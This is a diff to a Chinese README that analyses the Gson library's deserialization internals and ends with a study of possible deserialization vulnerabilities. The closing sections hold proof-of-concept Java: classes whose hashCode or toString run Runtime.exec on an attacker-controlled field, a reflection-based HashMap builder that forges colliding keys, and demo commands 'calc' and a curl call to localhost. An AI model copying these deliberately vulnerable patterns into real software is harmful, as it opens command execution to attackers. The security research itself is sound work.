@@ -188,8 +188,8 @@ TypeToken.get-->getAdapter("getAdapter(typeToken)")
 getAdapter -->typeAdapter.read("typeAdapter.read(reader)")
 typeAdapter.read-->return("return ojbect")
 
-gson("gson=new Gson()")-.->Gson.factories[Gson.factories]
-getAdapter -.- Gson.factories[Gson.factories]
+gson("gson=new Gson()")-.set.->Gson.factories[Gson.factories]
+getAdapter -.Factory#create.- Gson.factories[Gson.factories]
 ```
 
 # com.google.gson.internal.bind.ReflectiveTypeAdapterFactory
@@ -304,7 +304,7 @@ createBoundField()函数返回BoundField对象，其中包含了Field的read,wri
   }
 ```
 
-## create流程图
+## create流程
 
 ```mermaid
 graph TB
@@ -326,7 +326,7 @@ return-.->createBoundField
 
 ##  read()
 
-在自定义类反序列化时，会调用com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.Adapter#read()方法：
+在自定义类反序列化时，会调用com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.Adapter#read()方法，其boundFields已经在create时配置好，读取相关字段时递归调用对应的Adapter。
 
 ```java
   public static final class Adapter<T> extends TypeAdapter<T> {
@@ -392,7 +392,79 @@ public static final TypeAdapterFactory STRING_FACTORY = newFactory(String.class,
 
 # Map
 
-再看一下Map的read()，先
+## create
+
+com.google.gson.internal.bind.MapTypeAdapterFactory#create，在生产Adapter时，用`$Gson$Types.getMapKeyAndValueTypes`获取key和value的类型，再通过getKeyAdapter和gson.getAdapter分别获取key和value的Adapter
+
+```java
+  @Override public <T> TypeAdapter<T> create(Gson gson, TypeToken<T> typeToken) {
+    Type type = typeToken.getType();
+
+    Class<? super T> rawType = typeToken.getRawType();
+    if (!Map.class.isAssignableFrom(rawType)) {
+      return null;
+    }
+
+    Class<?> rawTypeOfSrc = $Gson$Types.getRawType(type);
+    Type[] keyAndValueTypes = $Gson$Types.getMapKeyAndValueTypes(type, rawTypeOfSrc);
+    TypeAdapter<?> keyAdapter = getKeyAdapter(gson, keyAndValueTypes[0]);
+    TypeAdapter<?> valueAdapter = gson.getAdapter(TypeToken.get(keyAndValueTypes[1]));
+    ObjectConstructor<T> constructor = constructorConstructor.get(typeToken);
+
+    @SuppressWarnings({"unchecked", "rawtypes"})
+    // we don't define a type parameter for the key or value types
+    TypeAdapter<T> result = new Adapter(gson, keyAndValueTypes[0], keyAdapter,
+        keyAndValueTypes[1], valueAdapter, constructor);
+    return result;
+  }
+```
+
+但是注意，如果采用以下写法，getKeyAdapter和gson.getAdapter并不会获取真正Key和Value的类型，而会获取泛型`K,V`：
+
+```java
+        Gson gson3 =new Gson();
+        HashMap<String, User> map= new HashMap<String, User>();
+        map.put("anemone", user);
+        String jsonMap=gson.toJson(map);
+
+        Gson gson4 =new Gson();
+        Map map2=gson4.fromJson(jsonMap,HashMap.class);
+        System.out.println(map2);
+```
+
+这带来的后果就是，即使我们Map中存的是自定义类型，由于在反序列化时Gson不知道具体时啥类型，所以一律反序列化成LinkedMap，例如上面代码，序列化对象应该是：
+
+![1568625740398](README/1568625740398.png)
+
+而实际上，反序列化后对象变成了：
+
+![1568625786743](README/1568625786743.png)
+
+正确的反序列化写法应该是：
+
+```java
+Gson gson4 = new Gson();
+Type type = new TypeToken<HashMap<String, User>>(){}.getType();
+Map map2=gson4.fromJson(jsonMap,type);
+System.out.println(map2);
+```
+
+或者用一个自定义对象包装：
+
+```java
+        Gson gson5 =new Gson();
+        MyContainer myContainer=new MyContainer();
+        myContainer.setStringUserHashMap(map);
+        json=gson5.toJson(myContainer);
+
+        Gson gson6 =new Gson();
+        MyContainer myContainer2=gson6.fromJson(json, MyContainer.class);
+        System.out.println(myContainer2);
+```
+
+## read()
+
+再看一下Map的read()，先构造一个空Map，读取key和value，依次放进map中，调用map.put方法
 
 ```java
     @Override public Map<K, V> read(JsonReader in) throws IOException {
@@ -434,3 +506,234 @@ public static final TypeAdapterFactory STRING_FACTORY = newFactory(String.class,
     }
 ```
 
+## Map的键名为自定义对象
+
+用Map时，map的key如果为自定义对象，需要enableComplexMapKeySerialization：
+
+```java
+        Gson gson5 = GsonBuilder().enableComplexMapKeySerialization()
+            .setPrettyPrinting().create();
+        UserContainer userContainer=new UserContainer();
+        HashMap<User, String> hashMap=new HashMap<>();
+        hashMap.put(user, "String");
+        userContainer.setUserUserHashMap(hashMap);
+        json=gson5.toJson(userContainer);
+        System.out.println(json);
+
+        Gson gson6 =GsonBuilder().enableComplexMapKeySerialization()
+            .setPrettyPrinting().create();
+        UserContainer userContainer1=gson6.fromJson(json, UserContainer.class);
+        System.out.println(userContainer1);
+
+```
+
+# 讨论反序列化漏洞的可能性
+
+## QNameXString无法利用
+
+看到map的put方法，可以想到有一个QNameXString的Gadgets，但是在Gson上是无效的，主要有以下两点原因：
+
+首先，QName没有无参构造方法，导致无法反序列化。
+
+其次，Gson默认不允许在同一容器中存放不同类型的键/值：
+
+> **Supporting richer serialization semantics than deserialization semantics**
+>
+> Gson supports serialization of arbitrary collections, but can only deserialize genericized collections. this means that Gson can, in some cases, fail to deserialize Json that it wrote.
+
+##  理论上的反序列化漏洞
+
+按之前分析，如果一个类可以导致Gson的反序列化漏洞，目前能想到的可能性是：
+
+1. 类VulnObject有空参数的构造方法，以保证Gson可以反序列化；
+2. 类VulnObject重写了一个不安全的hashCode()方法，具体来说，该方法会调用rmi/runtime.exec等敏感函数，并且参数可控；
+3. 存在类 VulnContainer可反序列化，其中有一Field为`HashMap<VulnObject, T> `，即有一个hashmap的key为VulnObject。
+
+示例代码：
+
+```java
+public class VulnObject {
+    private String cmd;
+    public VulnObject() {}
+
+    public String getCmd() {
+        return cmd;
+    }
+
+    public void setCmd(String cmd) {
+        this.cmd = cmd;
+    }
+
+    @Override
+    public int hashCode() {
+        try {
+            Runtime.getRuntime().exec(cmd);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        int hash=0;
+        for (char c: cmd.toCharArray()) {
+            hash^=c;
+        }
+        return hash;
+    }
+}
+```
+
+```java
+public class VulnContainer {
+    private HashMap<VulnObject, String> vulnObjectHashMap;
+
+    public HashMap<VulnObject, String> getvulnObjectHashMap() {
+        return vulnObjectHashMap;
+    }
+
+    public void setvulnObjectHashMap(HashMap<VulnObject, String> vulnObjectHashMap) {
+        this.vulnObjectHashMap = vulnObjectHashMap;
+    }
+
+    public static void main(String[] args) {
+        VulnObject object=new VulnObject();
+        object.setCmd("calc");
+        HashMap<VulnObject, String> map=new HashMap<>();
+        map.put(object,"foo");
+        VulnContainer vulnContainer=new VulnContainer();
+        vulnContainer.setvulnObjectHashMap(map);
+        
+        Gson gson1 = new GsonBuilder().enableComplexMapKeySerialization().create();
+        String json=gson1.toJson(vulnContainer);
+        System.out.println(json);
+        
+        Gson gson2 = new GsonBuilder().enableComplexMapKeySerialization().create();
+        VulnContainer myContainer2=gson2.fromJson(json, VulnContainer.class);
+        System.out.println(myContainer2);
+    }
+}
+```
+
+注意第25行，只有代码中真实指定了反序列化类为VulnContainer.class时，才会出现漏洞。
+
+或者，类似QNnameXString：
+
+1. 类VulnObject有空参数的构造方法，以保证Gson可以反序列化；
+2. 类VulnObject重写了一个不安全的hashCode()方法，具体来说，可以构造一个实例，使之hashcode为指定的值；
+3. 类VulnObject重写了一个不安全的equals()方法，具体来说，该方法会调用rmi/runtime.exec等敏感函数，并且参数可控；
+4. 存在类 VulnContainer可反序列化，其中有一Field为`HashMap<VulnObject, T> `，即有一个hashmap的key为VulnObject。
+
+示例代码：
+
+```java
+public class VulnObject {
+    private String cmd;
+    public VulnObject() {}
+    public String getCmd() { return cmd; }
+    public void setCmd(String cmd) { this.cmd = cmd; }
+
+    @Override
+    public String toString(){
+        try { Runtime.getRuntime().exec(cmd); }
+        catch (IOException e) { e.printStackTrace(); }
+        return cmd;
+    }
+
+    @Override
+    public int hashCode() {
+        int hash=0;
+        for (char c: cmd.toCharArray()) { hash^=c;}
+        return hash;
+    }
+    @Override
+    public boolean equals(Object obj) {
+        return this.toString().equals(obj.toString());
+    }
+}
+```
+
+```java
+public class VulnContainer {
+    private HashMap<VulnObject, String> vulnObjectHashMap;
+
+    public HashMap<VulnObject, String> getvulnObjectHashMap() {
+        return vulnObjectHashMap;
+    }
+
+    public void setvulnObjectHashMap(HashMap<VulnObject, String> vulnObjectHashMap) {
+        this.vulnObjectHashMap = vulnObjectHashMap;
+    }
+}
+```
+
+```java
+public class Main {
+    public static void main(String[] args) throws Exception {
+        HashMap o = getPoC("curl http://localhost:8000/rce");
+        VulnContainer myContainer=new VulnContainer();
+        myContainer.setvulnObjectHashMap(o);
+
+        Gson gson1 = new GsonBuilder().enableComplexMapKeySerialization().create();
+        String json=gson1.toJson(myContainer);
+        System.out.println(json);
+
+        Gson gson2 = new GsonBuilder().enableComplexMapKeySerialization().create();
+        VulnContainer myContainer2=gson2.fromJson(json, VulnContainer.class);
+        System.out.println(myContainer2);
+    }
+    static HashMap getPoC(String cmd) throws Exception {
+        VulnObject object1=new VulnObject();
+        object1.setCmd(cmd);
+        VulnObject object2=new VulnObject();
+        object2.setCmd(cmd);
+        String value="foo";
+        HashMap ret = makeMap(object1, object2, value);
+        return ret;
+    }
+    public static<T,S> HashMap<T,S> makeMap(T k1, T k2, S v) throws Exception {
+        HashMap<T, S> s = new HashMap<>();
+        Reflections.setFieldValue(s, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        } catch (ClassNotFoundException e) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, k1, v, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, k2, v, null));
+        Reflections.setFieldValue(s, "table", tbl);
+        return s;
+    }
+
+    public static class Reflections {
+        public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
+            try {
+                Field field = clazz.getDeclaredField(fieldName);
+                if (field != null)
+                    field.setAccessible(true);
+                else if (clazz.getSuperclass() != null)
+                    field = getField(clazz.getSuperclass(), fieldName);
+
+                return field;
+            } catch (NoSuchFieldException e) {
+                if (!clazz.getSuperclass().equals(Object.class)) {
+                    return getField(clazz.getSuperclass(), fieldName);
+                }
+                throw e;
+            }
+        }
+        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+            final Field field = getField(obj.getClass(), fieldName);
+            field.set(obj, value);
+        }
+    }
+}
+```
+
+# 总结
+
+Gson的如下机制使反序列化漏洞很难发生：
+
+1. 每次反序列化都需要指定类，一个天然的白名单；
+2. 在自定义类的反序列化时用反射，因此不存在set/get类函数导致的漏洞；
+3. 在Map反序列化时有反序列化的可能，但是由于其泛型限制和第一点限制，很难构造反序列化漏洞。
